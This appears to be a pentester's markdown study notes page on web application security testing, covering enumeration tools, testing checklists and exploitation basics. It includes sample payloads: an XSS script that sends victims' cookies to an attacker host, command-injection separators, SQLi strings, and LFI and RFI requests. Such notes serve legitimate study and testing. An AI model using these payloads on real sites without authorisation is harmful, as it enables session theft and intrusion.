---
Author(s): M-Nelly
Source: Internal
Subject: Penetration Testing
Topic: Web Application Security
Description: 
Comments: 
tags:
  - security
  - pentesting
---
## To-Do
- [ ] Nuclei
- [x] Request Forgery
- [ ] File Uploads
## Notes
### Getting Started
Once you have identified hosts that are running some kind of web service, you should immediately note those hosts for further investigation. Tons of vendors will provide users with management consoles that are incredibly vulnerable to very basic authentication bypass attacks or, even better, they don't have authentication to begin with. Even more common are authentication portals that still accept default credentials. This is especially common on network printers. 

While mapping a web application, it is important that you make note of any endpoints which accept user input. Things like login forms, search bars, etc. are all potentially susceptible to some kind of injection attack. Tools like [[FeroxBuster]] can be used to identify additional URIs; however, before you start running scans, you should manually crawl the application in what is considered the "happy path" or the intended way the application is to be used. If this is a web page you intend to test thoroughly, I recommend using a proxy like [[BurpSuite]] or ZAP to keep track of requests, pages, etc. that you discover. This will allow you to continue testing by looking retrospectively at the traffic from your initial exploration. 

A typical "happy path" will involve things like visiting each page linked on the home screen, creating an account, poking around at settings, etc. It is not an exhaustive crawl of the web pages available to you (very often this would take several hours to do). Once you have explored the application to the fullest extent that a normal user would, you should have gathered enough information along the way to start mapping the application's technologies and doing research on potential vulnerabilities. Things you want to identify if possible are frontend and backend frameworks, server-side technologies, server operating system, and the web server version. You can collect most of this information passively with the [Wappalyzer](https://www.wappalyzer.com/) browser extension and [Nikto](https://github.com/sullo/nikto). I tend to collect this information and store it in a fingerprint section of my notes. You should also make note of the CSP headers and HTTP versions you see. 

Once you have done your fingerprinting and have a decent idea of what technologies you are looking for, you can start enumerating bot control files (`sitemap.xml`, `robots.txt`, etc.). Once that is done, you probably want to begin brute forcing directories. I'd recommend using a tool like [cewl](https://github.com/digininja/CeWL) to generate a custom wordlist to add to existing brute forcing lists like directory-list-2.3-medium.txt or big.txt available in [seclists](https://github.com/danielmiessler/SecLists) under Discovery/Web-Content. Most websites will have some form of rate limiting in place, so I would recommend prepending your custom list and tuning your brute forcing to send somewhere around 10 requests per second or use multiple proxies to distribute your traffic. This should be more than safe for most applications. 

Enumeration example commands:
- `gobuster dir -u https://example.com -w wordlist -lk -o gobuster.txt` 
- `dirsearch -u http://example.com`
- `feroxbuster -u http://example.com -L 10 -t 10 -qn -w wordlist`
- `nikto -h https://example.com`
- `wpscan --url http://example.com -e -o wpscan.txt`
FUZZ Header Value
- `wfuzz -c -p 127.0.0.1:8080 -u http://example.com/ -w wordlist -H "host:FUZZ.example.com"
- `ffuf -c -w wordlist -u http://example.com -H "host FUZZ.example.com" -mc 200,301,302`
### Testing For Vulnerabilities
There are a ton of questions that you need to be answering as you analyze an application for exploitable functionality. This list may seem overwhelming at first; however, you will very quickly start to internalize most of these questions and build it into your testing workflow. At the core of your testing should be the identification of points where the user interacts with the application, the application interacts with the user, the application interacts with the back-end systems, and the application interacts with external systems. 
#### Testing User Registration
- [ ] Can anyone register for access?
- [ ] Are registrations vetted by a human prior to provisioning, or are they automatically granted if the criteria are met?
- [ ] Can the same person or identity register multiple times?
	- [ ] Can a user be re-registered using spaces or null characters?
- [ ] Can users register for different roles or permissions?
- [ ] What proof of identity is required for a registration to be successful?
- [ ] Are registered identities verified?
- [ ] Can identity information be easily forged or faked?
- [ ] Can the exchange of identity information be manipulated during registration?
#### Testing Authentication
- [ ] How does the application authenticate a user?
- [ ] How does a user change their credentials?
- [ ] Can a user reset or recover their account?
- [ ] Are all functions properly protected by TLS?
- [ ] Does the application reveal if a username is valid?
- [ ] Are attempts to conduct automated attacks prevented?
- [ ] Does the application require reauthentication to manipulate sensitive information?
- [ ] Does the application indicate how passwords are stored?
- [ ] Does the application require strong passwords?
#### Testing Token/Session Management
- [ ] What does the application use for a temporary credential?
- [ ] Are the credential's contents viewable (token)?
- [ ] Are the credential's contents mutable (token)?
- [ ] Is the credential predictable (session)?
- [ ] Is a new credential provided at login (session)?
- [ ] Is the credential destroyed upon logout (session)?
- [ ] Does the credential expire after a reasonable period of time?
- [ ] Are authenticated credentials protected by TLS encryption?
- [ ] Are credential cookie flags set to `Secure`, `HttpOnly`, and `SameSite`?
#### Testing Authorization
- [ ] Can users of any context access data or functionality that should require a higher level of privilege?
- [ ] Can users access data belonging to other users that should be inaccessible?
	- [ ] Check for direct object reference in request parameters. 
#### Testing for Injections
- [ ] Where does the app accept input?
- [ ] Which inputs appear in the user interface unchanged?
	- [ ] XSS (Cross Site Scripting), SSTI (Server-Side Template Injection)
- [ ] Which inputs appear to impact data store queries?
	- [ ] SQL, LDAP, XPath Injection
- [ ] Which inputs appear to impact system commands?
	- [ ] OSCI (OS Command Injection)
- [ ] Which inputs determine the destination of a redirect?
	- [ ] Open Redirect
- [ ] Which inputs appear to reference local files?
	- [ ] Do they permit reading arbitrary files on the system?
	- [ ] Does the server execute the file contents when referenced?
- [ ] Which inputs appear to reference third-party resources?
	- [ ] Do they provide indirect access to resources not directly accessible from an external perspective?
- [ ] Does the application authenticate individual requests for sensitive transactions?
	- [ ] Does the server accept and process forged requests?
- [ ] Does the application accept POST payloads as query strings in a GET request?
- [ ] Which user controlled inputs are dynamically added to the page by client-side code?
	- [ ] Do they accept and execute client-side code?
- [ ] Which inputs appear to be attributes for the creation of a model object?
	- [ ] Does the associated request process additional attributes?
- [ ] Do any requests contain XML payloads?
	- [ ] Does the server accept and process Document Type Definitions (DTD)?
- [ ] Which inputs contain serialized data in a non-traditional format?
	- [ ] Do they accept and deserialize arbitrary objects?
#### Testing for File Inclusions
- [ ] Which inputs contain file data that is stored by the server?
	- [ ] Does the application permit users to upload arbitrary files?
	- [ ] Are uploaded files stored on the file system?
	- [ ] Are uploaded files accessible under the web root?
	- [ ] Are uploaded files in executable space?
	- [ ] Are uploaded files accessible to other users?
	- [ ] Are uploaded files analyzed for malware?
#### Testing for Logic Flaws
- [ ] Do sequential process flows exist?
	- [ ] Can flows be executed out of order?
- [ ] Where are the key elements of business logic?
	- [ ] Can contextual logic be abused to negatively affect the business?
#### Testing for Encryption Flaws
- [ ] Does the application support TLS?
- [ ] Does the application leverage a wildcard certificate?
- [ ] Does the application allow for mixed content (active or passive)?
- [ ] Does the application prevent MITM attacks from stripping TLS from new connections?
- [ ] Does the application restrict the use of trusted certificate authorities? 
- [ ] Does the application support the latest protocols?
- [ ] Does the application leverage weak signature algorithms?
- [ ] Does the application leverage weak encryption algorithms?
- [ ] Does the application implement forward secrecy?
- [ ] Does the application implement strong DHE parameters?
- [ ] Does the application support client initiated renegotiation?
#### Testing for DoS
- [ ] Do any requests take a long time to respond?
- [ ] Do any inputs force the app to increase processing time such as wildcard searches?
- [ ] Do any inputs appear to be written to the file system or log?
- [ ] Can users upload files to the server?
	- [ ] Are upload sizes and quantities restricted?
- [ ] Can user accounts be systematically locked out?
- [ ] How does the app recover from DoS?
### Exploitation
#### Injections
Once you have a list of entry points into the application, you will want to start testing for injections. Generally speaking, you can identify most types of injections by using the injection omnibus:
```
dddd",'|&$;:`({{@<\%=ddd
```
This will usually cause an error in the application if input is not sanitized properly. If this does not produce visible results, that does not mean that injection is not possible; however, in a cursory review of the application it is a pretty good indication that the entry point you are testing is not *particularly* vulnerable. If you do get an error from the omnibus or otherwise suspect that an entry point is vulnerable, you should continue testing with known payloads. Tools like [[BurpSuite]]'s intruder are particularly well suited for this task. Wordlists for this type of fuzzing can be found in [seclists](https://github.com/danielmiessler/SecLists) under Fuzzing. 

Injection testing beyond the basics is effectively reverse engineering. You are looking to understand the server-side functions that are taking place with your input. You'll need to understand basic web app functions and a little bit of programming in order to do this effectively. I'd recommend taking a basic full-stack course if you're going to dedicate time to web app testing. 
###### Structured Query Language Injection (SQLi)
If you are aware of a SQL injection vulnerability, I would recommend testing manually using known-good input + your injection string instead of the typically recommended `OR 1=1`. The following examples are considered "safe". 
- `valid_input'-- -`
- `valid_input'select * from information_schema.tables -- -`
Another option is to use [[SQLMap]] with the default risk settings which might work depending on how easy the injection is. 
- `sqlmap -r form.sqlmap --batch`
- `sqlmap -r form.sqlmap --batch --dbms sqlite --tables`
- `sqlmap -r form.sqlmap --batch --dbms sqlite -t $table --dump`
There are several [cheatsheets](https://tib3rius.com/sqli) you can reference while testing. I would recommend you do some of the labs in the [PortSwigger Web Security Academy](https://portswigger.net/web-security) before testing these in the wild. The last thing you want to do is drop a database that hasn't been properly backed up. 
###### Operating System Command Injection (OSCi)
Testing for command injection is usually fairly easy once you identify a component that is potentially vulnerable. Understanding Windows and Linux commands and their output is incredibly beneficial in this scenario. Use the following payloads to start testing for arbitrary execution:
```
command1; command2 
command1 & command2
command1 && command2
command1 | command2
command1 || command2
command1 `command2`
command1 $(command2)
command1%0d%0acommand2
command1\r\ncommand2 
```

If you are hunting a novel vulnerability in a modern web application for something like a bug bounty, you are not likely to have success with these techniques. For much more in-depth training on web application testing with modern techniques, I recommend looking at [PortSwigger's Web Security Academy](https://portswigger.net/web-security). 
###### Cross-Site Scripting (XSS)
XSS 
- Client-Side code injection
- Violates the trust a user has in the application
- Allows attacker to control over the victims browser
- Three flavors: Stored, Reflected, DOM-Based
XSS Context 
- HTML - Input directly into HTML form
- HTML Attribute - Input into an HTML attribute 
- JavaScript - Input into JS variable
- Event handlers execute JS without a script tag
	- Useful when script tags are disallowed in the html context
	- Useful when <> are disallowed in the attribute context
- Default encoders usually only protect against the HTML context
- [OWASP Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [Portswigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 
Reflected XSS
- Non-Persistent or Type-I XSS
- User input is reflected back within the content of the immediate response
- Common in search and error pages
- Most exploitable as a GET request parameter
	- Still exploitable as POST, test for method interchange
- Requires user interaction
	- Exploited through some sort of social engineering
	- The following payload can be used to steal user's cookies:
```html
<script>document.write('<img src="http://<LHOST IP>:<LHOST PORT>/test.gif?cookie=' + document.cookie + '" />')</script>
```

DOM-Based XSS
- Also known as D-XSS or Type-0 XSS
- User input is processed client-side
	- Independent of the server
	- Added to the page through DOM manipulation
- Found by tracing sources to sinks in client-side code
- Common in applications that rely on client-side rendering 
- Extremely difficult for scanners to find
	- Requires parsing and executing JS in a browser context
- In some cases, servers cannot protect the client
- Exploited similarly to Reflected XSS
	- Input can still be persisted on the client side
- Script tags don't work for DOM XSS
	- Script tags are only parsed once during initial page load
- Event handlers are the preferred payload delivery mechanism
	- `<img src=foo onerror="alert(document.cookie)" />
#### File Inclusion & Request Forgery
At a high level, when you make a request to a web server, it is the server's job to retrieve files relevant to that request and return them to you. The way a web application handles those files can present a multitude of security issues. 

File inclusion and request forgery are potentially possible under conditions where the application is making a request to a local file or a remote web page where the request is a parameter you control. Here is an example of that parameter being in the URL:
```http
GET https://example.com/page?page=about.php
```
Note that these request parameters can appear in other locations such as the referrer header. 
###### Client Side Request Forgery (CSRF)
CSRF allows an attacker to craft a request that they can coerce other users of a site into making that will perform an action as the target user. This is possible when the `SameSite` attribute is not set on cookies used for authentication and re-authentication is not required for the desired actions to be performed. 
>[!NOTE]
For a CSRF attack to be possible, three key conditions must be in place:
>
>- **A relevant action.** There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).
>- **Cookie-based session handling.** Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.
>- **No unpredictable request parameters.** The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.
>
>Source: [PortSwigger Web Security Academy](https://portswigger.net/web-security/csrf)
###### Server Side Request Forgery (SSRF)
[SSRF](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery) is possible when the web application is making an HTTP request for the content it is attempting to retrieve. Generally speaking, this is done to access a local resource without authenticating:
```http
GET https://example.com/page?page=http://localhost/admin
```
There is also the possibility that another attack such as [XXE](https://portswigger.net/web-security/xxe)  might lead to or enable SSRF. You might also be able to leverage CSRF attacks or [Open Redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected) to bypass [SSRF](https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses) filters. 

When you discover the conditions needed for SSRF, you should also be testing for LFI and RFI since they require the similar conditions. Here are some examples of things you can try when you have a request URL under your control:
- [Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
```http
GET https://example.com/page?page=../../../../etc/passwd
```
- [Remote File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)
```http
GET https://example.com/page?page=https://my-rfi-domain.com/malicious-page.php
```
It is important to note that RFI and LFI are not SSRF attacks; however, in the event that you discover a parameter that *might* be vulnerable to SSRF, it is also a possibility that LFI/RFI are possible. 
#### File Upload Vulnerabilities
- Burp Upload Scanner
- Test MIME Type Swapping
- Test Nested File Extensions
- Test Alternate File Extensions
- Look For Uploads Directory
#### Other Tests
- [Method Interchange](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods)
- [Mass Assignment](https://learn.snyk.io/lesson/mass-assignment/)
- [Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
- [XML External Entity Injection (XXE)](https://portswigger.net/web-security/xxe)
- [Insecure Deserialization](https://portswigger.net/web-security/deserialization)
- [Clickjacking Test Site](https://clickjacker.io)
- [Content Security Policy (CSP) Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy)
- [Server Side Template Injection (SSTi)](https://portswigger.net/web-security/server-side-template-injection)
- [Client Side Template Injection (CSTi)](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)
- [Cross Origin Resource Sharing (CORS) Testing](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
## References
### External
- [Nikto](https://github.com/sullo/nikto)
- [Wappalyzer](https://github.com/wappalyzer/wappalyzer)
- [SSLyze](https://github.com/nabla-c0d3/sslyze)
- [SQLMap](https://github.com/sqlmapproject/sqlmap)
- [Burp CEWL Extension](https://gist.github.com/lanmaster53/a0d3523279f3d1efdfe6d9dfc4da0d4a)
### Internal
- [[BurpSuite]]

